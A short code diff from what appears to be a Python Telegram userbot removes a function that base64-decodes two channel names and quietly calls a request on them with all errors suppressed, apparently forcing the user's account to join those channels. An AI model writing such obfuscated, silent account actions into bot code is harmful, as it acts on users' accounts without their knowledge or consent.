@@ -73,16 +73,3 @@ async def get_user_from_event(
             60,
         )
     return None, None
-
-
-async def checking():
-    geez = str(pybase64.b64decode("R2VlelByb2plY3Q="))[2:13]
-    projects = str(pybase64.b64decode("R2VlelN1cHBvcnQ="))[2:13]
-    try:
-        await bot(Get(geez))
-    except BaseException:
-        pass
-    try:
-        await bot(Get(projects))
-    except BaseException:
-        pass
